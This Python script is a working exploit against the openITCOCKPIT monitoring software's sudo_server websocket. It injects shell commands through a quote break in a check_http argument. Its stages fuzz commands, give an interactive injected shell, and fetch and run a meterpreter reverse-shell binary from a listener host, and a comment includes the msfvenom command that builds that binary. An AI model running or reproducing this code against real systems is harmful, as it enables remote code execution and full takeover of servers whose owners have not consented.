import websocket
import ssl 
import json
import argparse
import _thread as thread
import warnings
import time

warnings.filterwarnings("ignore")
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
uniqid = ""
key = ""
stage = ""
listener_ip = ""

def on_open(ws):
    def run():
        global cmd
        if stage == "get_reverse_shell" and not listener_ip:
            parser.print_usage()
            exit(1)

        if stage == "fuzz":
            fuzz_list = [line.strip() for line in open('fuzzing_list.txt').readlines()]
            for cmd in fuzz_list:
                print('[+] Running command "%s"' % cmd)
                ws.send(toJson("execute_nagios_command", cmd))
                time.sleep(1)

        elif stage == "fuzz_inject_command":
            fuzz_template = [line.strip() for line in open('command-injection-template.txt').readlines()]
            for template in fuzz_template:
                cmd = template.replace('{cmd}', 'whoami')
                print('[+] Running command "%s"' % cmd)
                ws.send(toJson("execute_nagios_command", cmd))
                time.sleep(1)

        elif stage == "inject_command":
            while True:
                cmd = input()
                cmd = "./check_http -k' -c '%s" % cmd
                print('[+] Running command "%s"' % cmd)
                ws.send(toJson("execute_nagios_command", cmd))

        elif stage == "get_reverse_shell":
            # msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<listener_ip> LPORT=4444 -f elf -o reverse.elf
            print("[+] Triggering reverse shell...")
            cmd = "wget %s/reverse.elf -O /tmp/reverse.elf" % listener_ip
            cmd = "./check_http -k' -c '%s" % cmd
            ws.send(toJson("execute_nagios_command", cmd))
            cmd = "chmod 777 /tmp/reverse.elf"
            cmd = "./check_http -k' -c '%s" % cmd
            ws.send(toJson("execute_nagios_command", cmd))
            cmd = "/tmp/reverse.elf"
            cmd = "./check_http -k' -c '%s" % cmd
            ws.send(toJson("execute_nagios_command", cmd))

        else:
            while True:
                cmd = input()
                print('[+] Running command "%s"' % cmd)
                ws.send(toJson("execute_nagios_command", cmd))

    thread.start_new_thread(run, ())

def toJson(task,data):
    req = {
        "task": task,
        "data": data,
        "uniqid": uniqid,
        "key" : key
    }
    return json.dumps(req)

def on_message(ws, message):
    global cmd
    mes = json.loads(message)

    if "uniqid" in mes.keys():
        uniqid = mes["uniqid"]

    if mes["type"] == 'connection' and mes["payload"] =="Connection established":
        print("[+] Connection Established!")
    elif mes["type"] == "dispatcher":
        pass
    elif mes["type"] == "response":
        print(mes["payload"].rstrip())
    else:
        print(mes)

def on_error(ws, error):
    print(error)

def on_close(ws):
    print("[+] Connection Closed")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--ip', help='IP Address is mandatory', required=True, type=str)
    parser.add_argument('--key', '-k', help='openITCOCKPIT Key', required=True, dest='key')
    parser.add_argument('-v', '--verbose', help='Print more data', action='store_true')
    parser.add_argument('-l', '--listener', help='Listener IP', type=str)
    parser.add_argument('--stage', '-s', help='Stage', required=True, type=str)
    args = parser.parse_args()

    key = args.key
    url = 'wss://%s/sudo_server' % args.ip
    stage = args.stage
    listener_ip = args.listener
    websocket.enableTrace(args.verbose)
    ws = websocket.WebSocketApp(url,
                              on_message = on_message,
                              on_error = on_error,
                              on_close = on_close,
                              on_open = on_open)
    ws.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE})
